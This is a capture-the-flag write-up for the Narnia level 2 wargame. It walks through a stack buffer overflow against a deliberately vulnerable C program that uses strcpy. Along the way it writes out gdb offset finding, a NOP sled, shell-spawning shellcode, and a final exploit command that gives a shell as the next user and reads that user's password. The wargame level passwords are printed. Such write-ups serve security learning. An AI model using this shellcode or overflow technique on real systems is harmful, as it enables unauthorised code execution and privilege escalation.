# Narnia2

- Username: narnia2
- Password: nairiepecu

Source code:

```c

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

This is a classic example of a buffer overflow. The function `strcpy` does not
check the size of the data it copies, which means we can potentially write
outside of the limits of the assigned buffer.
Let's force the segmentation fault and see how can we exploit it.

An input of 129 characters does not break the program. We are certainly writting
out of bounds but we are not yet overwritting the program counter.

> Note I send the slash character using the hex code to be sure how many bytes
we are sending. Depending on the character encoding, character chosen, etc ...
it could mean we are sending several bytes per character.

```sh
narnia2@narnia:~$ /narnia/narnia2 "$(for i in {0..128};do echo -ne '\x2f';done)"
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
```

Increasing the number of slashes up to 132 crashes the program:

```sh
narnia2@narnia:~$ /narnia/narnia2 "$(for i in {0..131};do echo -ne '\x2f';done)"
Segmentation fault
```

Let's be sure that we overwrite the program counter. If we run the program using
`gdb` we can see where does the program counter point.

As we can see below, running the program with 132 characters causes a crash, but
only if we keep pushing more characters we overwrite the program counter to
`0x2f2f2f2f`:

```sh
narnia2@narnia:~$ gdb -q /narnia/narnia2
Reading symbols from /narnia/narnia2...(no debugging symbols found)...done.
(gdb) r $(for i in {0..131};do echo -ne '/';done)
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia2 $(for i in {0..131};do echo -ne '/';done)

Program received signal SIGSEGV, Segmentation fault.
0xf7e2a202 in __libc_start_main () from /lib32/libc.so.6
(gdb) r $(for i in {0..140};do echo -ne '/';done)
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia2 $(for i in {0..140};do echo -ne '/';done)

Program received signal SIGSEGV, Segmentation fault.
0x2f2f2f2f in ?? ()
```

To find out the exact amount of padding we can use a marker. Following other
examples in previous challenges I will take `0xdeadbeef`as the target bytes
and use `0x2f` as padding:

```sh
(gdb) r $(for i in {0..131};do echo -ne '/';done)$(echo -ne '\xef\xbe\xad\xde')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia2 $(for i in {0..131};do echo -ne '/';done)$(echo -ne '\xef\xbe\xad\xde')

Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()
```

OK, now we can start crafting the exploit. We have 132 bytes available for the
payload and 4 bytes for the address where we want to jump.
The payload is going to be a shellcode. I will use the one in the previous
challenge to open a bash shell.

```sh
\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e
\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8
\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67
\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30
\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4
\x53\x52\x54\x8a\xe2\xce\x81
```

This shellcode is 57 bytes long. We will pad the rest to 132 prepending the byte
`0x90`, which corresponds to the code of the NOP instruction. This instruction
does literally nothing, so if we jump into a NOP, the program will continue to
the next one. In our case this will lead to our shellcode :)

Now for the tricky part: find out the address for the jump.

If we run the program with our payload there must be several (75) addreses with
NOP instructions. We can run it `gdb` and inspect the stack pointer (ESP):

```sh
(gdb) r $(for i in {0..74};do echo -ne '\x90';done)$(echo -ne '\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81')$(echo -ne '\xef\xbe\xad\xde')

(gdb) x/300wx $esp
0xffffd660:     0x00000000      0xffffd6f4      0xffffd700      0x00000000
0xffffd670:     0x00000000      0x00000000      0xf7fc5000      0xf7ffdc0c
0xffffd680:     0xf7ffd000      0x00000000      0x00000002      0xf7fc5000
0xffffd690:     0x00000000      0x21aa66e5      0x1b422af5      0x00000000
0xffffd6a0:     0x00000000      0x00000000      0x00000002      0x08048350
0xffffd6b0:     0x00000000      0xf7fee710      0xf7e2a199      0xf7ffd000
0xffffd6c0:     0x00000002      0x08048350      0x00000000      0x08048371
0xffffd6d0:     0x0804844b      0x00000002      0xffffd6f4      0x080484a0
0xffffd6e0:     0x08048500      0xf7fe9070      0xffffd6ec      0xf7ffd920
0xffffd6f0:     0x00000002      0xffffd817      0xffffd827      0x00000000
0xffffd700:     0xffffd8b0      0xffffd8c3      0xffffde7f      0xffffdeb2
0xffffd710:     0xffffdec1      0xffffded2      0xffffdedf      0xffffdef1
0xffffd720:     0xffffdefa      0xffffdf0d      0xffffdf2d      0xffffdf40
0xffffd730:     0xffffdf4c      0xffffdf63      0xffffdf73      0xffffdf87
0xffffd740:     0xffffdf92      0xffffdf9a      0xffffdfaa      0x00000000
0xffffd750:     0x00000020      0xf7fd7c90      0x00000021      0xf7fd7000
0xffffd760:     0x00000010      0x178bfbff      0x00000006      0x00001000
0xffffd770:     0x00000011      0x00000064      0x00000003      0x08048034
0xffffd780:     0x00000004      0x00000020      0x00000005      0x00000008
0xffffd790:     0x00000007      0xf7fd9000      0x00000008      0x00000000
0xffffd7a0:     0x00000009      0x08048350      0x0000000b      0x000036b2
0xffffd7b0:     0x0000000c      0x000036b2      0x0000000d      0x000036b2
0xffffd7c0:     0x0000000e      0x000036b2      0x00000017      0x00000001
0xffffd7d0:     0x00000019      0xffffd7fb      0x0000001a      0x00000000
0xffffd7e0:     0x0000001f      0xffffdfe8      0x0000000f      0xffffd80b
0xffffd7f0:     0x00000000      0x00000000      0x96000000      0x532a2679
0xffffd800:     0x1f8d6f03      0x3fb0a621      0x69485a8f      0x00363836
0xffffd810:     0x00000000      0x2f000000      0x6e72616e      0x6e2f6169
0xffffd820:     0x696e7261      0x90003261      0x90909090      0x90909090
0xffffd830:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd840:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd850:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd860:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd870:     0x11eb9090      0xb1c9315e      0x0e6c8021      0xe98001ff
0xffffd880:     0xebf67501      0xffeae805      0x0c6bffff      0x67539a59
0xffffd890:     0x8a712e69      0x696b53e2      0x62633069      0x63306974
0xffffd8a0:     0xe48a6f6a      0x8a545253      0xef81cee2      0x00deadbe
```

We see a bunch of NOP instructions around `0x0xffffd830` and `0xffffd860`. If we
pick any of these as entrypoint, the program flow should lead to the shellcode.

Let's try, this time without `gdb`:

```sh
narnia2@narnia:~$ /narnia/narnia2 $(for i in {0..74};do echo -ne '\x90';done)$(echo -ne '\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81')$(echo -ne '\x60\xd8\xff\xff')
bash-4.4$ whoami
narnia3
bash-4.4$ cat /etc/narnia_pass/narnia3
vaequeezee
bash-4.4$ 
```

We did it!
